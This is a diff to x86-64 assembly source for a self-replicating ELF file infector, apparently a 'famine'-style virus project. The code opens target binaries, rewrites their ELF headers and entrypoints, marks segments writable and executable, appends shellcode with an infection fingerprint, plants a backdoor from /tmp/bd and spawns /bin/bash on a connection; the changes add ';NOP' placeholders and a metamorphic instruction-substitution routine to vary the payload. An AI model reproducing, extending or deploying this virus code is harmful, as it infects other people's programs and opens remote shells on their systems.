@@ -76,7 +76,12 @@ _start:
 	pop rax
 	call list_files
 	add rsp, 8
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 ;chdir to /tmp/test2
 	mov rax, 80
 	xor rdi, rdi
@@ -102,6 +107,12 @@ _start:
 	add rsp, 8
 ;jmp end_of_everything
 exit_prog:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov	rax, 0x3c;
 	mov rdi, 0
 	syscall
@@ -158,6 +169,7 @@ retn
 ;void create_soft_bd()
 ;this will create a software backdoor
 create_soft_bd:
+
 	sub rsp, 1; buffer to read shellcode in
 
 	;open destination file
@@ -181,6 +193,7 @@ create_soft_bd:
 	syscall; open("/tmp/bd", O_RDONLY);
 	mov r14, rax 
 	pop rbx
+
 
 	;READ bd FILE
 	csb_read_loop:
@@ -218,6 +231,13 @@ ft_puts:
 	push rsi
 	push rdx
 	push rdi
+
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 
 	call ft_strlen
 	mov rdx, rax
@@ -465,7 +485,12 @@ check_cmdline_content:
 	push rdx
 	push rdi
 
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	call open_file
 	mov rdi, rax; store fd in rdi
 	sub rsp, 1 
@@ -580,6 +605,12 @@ retn
 
 ; exec_shell(int connfd)
 exec_shell:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov rax, 0
 	mov rax, 0x0068; "h\0"
 	push rax
@@ -620,7 +651,12 @@ exec_shell:
 	lea rdx, [rsp]
 	syscall; execve("/bin/bash", argv, envp);
 	jmp exit_prog
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	add rsp, 8
 	add rsp, 16
 	add rsp, 16
@@ -704,7 +740,12 @@ famine_file:
 	sub rsp, 4 ;fd
 	
 	;call ft_puts ;PRINT FNAME FOR DEBUGGING
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov [rsp + 20], rdi
 	call open_file
 	cmp rax, -1
@@ -788,7 +829,12 @@ famine_file:
 	syscall
 
 	;call debug
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	add rsp, 4
 	add rsp, 8
 	add rsp, 8
@@ -829,7 +875,12 @@ check_already_infected:
 	push rsi
 	push rdx
 	push rdi
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 
 	call open_file
 	mov rdi, rax; store fd in rdi
@@ -867,7 +918,12 @@ check_already_infected:
 		mov rax, 3
 		syscall
 		pop rax;restore return val
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop rdi
 	pop rdx
 	pop rsi
@@ -881,9 +937,20 @@ retn
 ; void *map_file(int fd, int *fsize)
 ; returns a ptr to fd mapped in memory
 map_file:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 8; start of file saved for lseek
 	push rsi; save fsize
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	; First we need to get the file size
 
 	mov rax, 8; lseek
@@ -905,7 +972,12 @@ map_file:
 	mov rax, 8
 	syscall; lseek(fd, start, SEEK_SET) put cursor back at start
 	pop rsi; rsi is now fsize again
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	;Time to map the file into memory
 	mov rax, 9; mmap
 	mov r8, rdi; fd
@@ -926,6 +998,12 @@ retn
 ; original bin but we edited it instead
 ; void overwrite_file(char *fname)
 overwrite_file:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	call ft_strlen
 	add rax, 10; so it can contain fname + "_infected" + '\0'
 	sub rsp, rax; our string containing fname + "_infected" + '\0' is [rsp + 8]
@@ -972,6 +1050,12 @@ retn
 ; int cread_infected_file(char *fname)
 ; creates a new file called fname + "_infected"
 create_infected_file: 
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 push rcx
 push rdx
 	
@@ -989,6 +1073,12 @@ push rdx
 		inc rcx
 		jmp cif_loop
 	cif_loop_exit:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov byte[rsi + rcx], '_'
 	inc rcx
 	mov byte[rsi + rcx], 'i'
@@ -1023,12 +1113,18 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 7304 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 7136 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 7131 
+%define SHELLCODE_LEN 7346 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 7178 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 7173 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	;ELF HEADER
 	call has_data_seg
 	mov QWORD[rsp], rax
@@ -1053,15 +1149,31 @@ parse64elf:
 	mov r10, rax; pass pad as 3rd param
 	mov rax, [rsp]; so we know if we have a data_seg or not 
 	call parse64elfsec
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	add rsp, 8
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 retn
 
 parse64elfheader:
 	push rdi
 	push rsi
 	push rdx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 8; new entrypoint stocked here
 	cmp rax, 0
 	je fne_text
@@ -1079,6 +1191,12 @@ parse64elfheader:
 	push rax
 	mov rax, 1
 	syscall; write(wfd, file, 24);
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	;Time to handle the entrypoint
 	pop rax
 	mov QWORD[rsp], rax;
@@ -1088,6 +1206,12 @@ parse64elfheader:
 	mov rdx, 8
 	mov rax, 1
 	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	;write e_phoff
 	mov rdx, 8
 	mov rsi, rbx
@@ -1101,16 +1225,32 @@ parse64elfheader:
 	mov rsi, rsp
 	mov rax, 1
 	syscall;write(wfd, &(e_shoff + SHELLCODE_LEN + pad), 8);
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	;Copy the remainder of the elf header
 	mov rsi, rbx
 	add rsi, 16
 	mov rdx, 16
 	mov rax, 1
 	syscall; write(wfd, file + 48, 16); copying everything after entrypoint
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 
 	add rsp, 8
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop rdx
 	pop rsi
 	pop rdi
@@ -1127,7 +1267,12 @@ find_new_entry:
 	push r9
 
 	sub rsp, 2; e_phnum
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
@@ -1136,7 +1281,12 @@ find_new_entry:
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	xor rcx, rcx
 	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fne: 
@@ -1156,7 +1306,12 @@ find_new_entry:
 		jmp loop_fne
 	loop_fne_exit: 
 	add rsp, 2
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop r9
 	pop rbx
 	pop rcx
@@ -1167,13 +1322,24 @@ retn
 ; unsigned long find_new_entry_text(void *file)
 ; will return the offset to begining of our shellcode
 find_new_entry_text:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	push rdi
 	push rsi
 	push rdx
 	push rcx
 	push rbx
 	push r9
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 2; e_phnum
 
 	mov rax, 0
@@ -1272,7 +1438,12 @@ find_end_text_seg:
 	push rcx
 	push rbx
 	push r9
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 2; e_phnum
 
 	mov rax, 0
@@ -1303,7 +1474,12 @@ find_end_text_seg:
 		jmp loop_fets
 	loop_fets_exit: 
 	add rsp, 2
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop r9
 	pop rbx
 	pop rcx
@@ -1320,7 +1496,12 @@ has_data_seg:
 	push rcx
 	push rbx
 	push r9
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 2; e_phnum
 
 	mov rax, 0
@@ -1397,7 +1578,12 @@ get_data_pad:
 		jmp loop_gdp
 	loop_gdp_exit: 
 	add rsp, 2
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop r9
 	pop rbx
 	pop rcx
@@ -1413,9 +1599,19 @@ get_text_pad:
 	push rcx
 	push rbx
 	push r9
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 2; e_phnum
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
@@ -1471,7 +1667,12 @@ parse64elfphdr:
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	xor rcx, rcx
 	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_p64ephdr: 
@@ -1606,10 +1807,22 @@ parse64elfphdrtext:
 	push rsi
 	push rdx
 
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+
 	sub rsp, 8; p_memsz
 	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov rax, 0
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
@@ -1618,7 +1831,12 @@ parse64elfphdrtext:
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	xor rcx, rcx
 	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_p64ephdrt: 
@@ -1817,6 +2035,12 @@ retn
 
 ;void write_shellcode(int wfd)
 write_shellcode:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 push rdi
 	sub rsp, PURE_SHELLCODE_LEN; buffer to read shellcode in
 	;OPEN SC FILE
@@ -1850,19 +2074,46 @@ push rdi
 pop rdi
 retn
 
+
 ;void metamorphic(char *code)
 metamorphic: 
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	; mov rax, 0 -> xor rax, rax
 	mov rax, 0x6000000000b8; mov eax, 0x0
 	push rax
 	mov rsi, rsp
 
-	mov rax, 0x609090c03148; xor rax, rax; NOP; NOP
+	mov rax, 0x609090c03148; xor rax, rax; ;NOP; ;NOP
 	push rax
 	mov rdx, rsp
 
 	mov r10, PURE_SHELLCODE_LEN
 	mov rcx, 5
+
+	call ft_str_replace
+	add rsp, 16
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	; \x90\x90\x90\x90\x90\x90 ->  0xc8ff48c0ff48
+	; ;NOP ;NOP ;NOP ;NOP ;NOP ;NOP -> inc rax; dec rax
+	mov rax, 0x60909090909090
+	push rax
+	mov rsi, rsp
+
+	mov rax, 0x60c8ff48c0ff48 
+	push rax
+	mov rdx, rsp
+
+	mov rcx, 6
 
 	;call ft_str_replace
 	add rsp, 16
@@ -1982,7 +2233,12 @@ ft_rand:
 	mov rdx, 1
 	mov rax, 0
 	syscall;read
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	cmp BYTE[rsp], 127
 	jae fr_one
 	fr_zero:
@@ -1993,7 +2249,12 @@ ft_rand:
 	fr_end:
 
 	add rsp, 1
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop rdi
 	pop rdx
 	pop rsi
@@ -2009,7 +2270,12 @@ retn
 
 write_jmp_shellcode:
 	sub rsp, 4; rel_jmp
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	push rsi
 	push 0x000000e9
 	mov rax, 1
@@ -2020,6 +2286,12 @@ write_jmp_shellcode:
 	pop rsi
 	mov rbx, rdi; save rdi
 	mov rdi, rsi
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	cmp r12, 0; check if data or text infection was used
 	je wjs_text
 	call find_new_entry
@@ -2038,6 +2310,12 @@ write_jmp_shellcode:
 	mov rdi, rbx
 	syscall; write(wfd, &jmp_addr, 4);
 	add rsp, 4
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 retn
 
 write_exit_shellcode:
@@ -2048,7 +2326,12 @@ write_exit_shellcode:
 	mov rax, 1
 	syscall; write(wfd, 0xb83c000000, 5);
 	pop rax
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov rax, 0x00000013bf; mov    edi,0x0
 	push rax
 	mov rsi, rsp
@@ -2056,7 +2339,12 @@ write_exit_shellcode:
 	mov rax, 1
 	syscall; write(wfd, 0xbf00000000, 5);	
 	pop rax
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	push 0x050f ; syscall
 	mov rsi, rsp
 	mov rdx, 2
@@ -2087,11 +2375,23 @@ retn
 
 %define FP_LEN 116
 write_fingerprint:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, FP_LEN;fingerprint buff (60 path + 40 fname +  8 (seconds) + 8 (ms))
 	push rdi; save fd to write to
 	lea rdi, [rsp + 8]; pass fingerprint buff
 	call generate_fingerprint
 	pop rdi
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	; write
 	mov rax, 1
 	lea rsi, [rsp]
@@ -2102,6 +2402,12 @@ retn
 
 ;void generate_fingerprint(char buff[FP_LEN])
 generate_fingerprint:
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	xor rcx, rcx 
 	loop_zero_buff:; let's bzero the buffer
 		cmp rcx, FP_LEN
@@ -2314,7 +2620,12 @@ find_new_entry32:
 	push rcx
 	push rbx
 	push r9
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 2; e_phnum
 
 	mov rax, 0
@@ -2363,9 +2674,19 @@ find_new_entry_text32:
 	push rcx
 	push rbx
 	push r9
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 2; e_phnum
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
@@ -2375,7 +2696,12 @@ find_new_entry_text32:
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	xor rcx, rcx
 	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fnet32: 
@@ -2395,7 +2721,12 @@ find_new_entry_text32:
 		jmp loop_fnet32
 	loop_fnet_exit32: 
 	add rsp, 2
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop r9
 	pop rbx
 	pop rcx
@@ -2411,7 +2742,12 @@ get_data_pad32:
 	push rcx
 	push rbx
 	push r9
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 2; e_phnum
 
 	mov rax, 0
@@ -2491,7 +2827,12 @@ get_text_pad32:
 		jmp loop_gtp32
 	loop_gtp_exit32: 
 	add rsp, 2
-	
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	pop r9
 	pop rbx
 	pop rcx
@@ -2506,7 +2847,12 @@ parse32elfphdr:
 	push rdi
 	push rsi
 	push rdx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 4; p_memsz
 	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
@@ -2520,7 +2866,12 @@ parse32elfphdr:
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	xor rcx, rcx
 	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_p32ephdr: 
@@ -2570,6 +2921,12 @@ parse32elfphdr:
 		pop rsi
 		pop rcx
 		pop rax
+		;NOP
+		;NOP
+		;NOP
+		;NOP
+		;NOP
+		;NOP
 		;write remaining p_align
 		push rax
 		push rcx
@@ -2631,6 +2988,12 @@ parse32elfphdr:
 		pop rsi
 		pop rcx
 		pop rax
+		;NOP
+		;NOP
+		;NOP
+		;NOP
+		;NOP
+		;NOP
 		;write remaining p_align
 		push rax
 		push rcx
@@ -2676,6 +3039,12 @@ parse32elfphdr:
 	pop rdx
 	pop rsi
 	pop rdi
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 retn
 
 ; unsigned long parse64elfphdrtext(void *file, int wfd)
@@ -2683,11 +3052,21 @@ parse32elfphdrtext:
 	push rdi
 	push rsi
 	push rdx
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	sub rsp, 4; p_memsz
 	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
-
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
@@ -2721,6 +3100,12 @@ parse32elfphdrtext:
 		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
 		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
 		je p32ephdrt_data_seg
+		;NOP
+		;NOP
+		;NOP
+		;NOP
+		;NOP
+		;NOP
 		;we just write the rest of the phdr if we get here
 		push rax
 		push rcx
@@ -2853,6 +3238,12 @@ parse32elfphdrtext:
 	pop rdx
 	pop rsi
 	pop rdi
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
+	;NOP
 retn
 
 
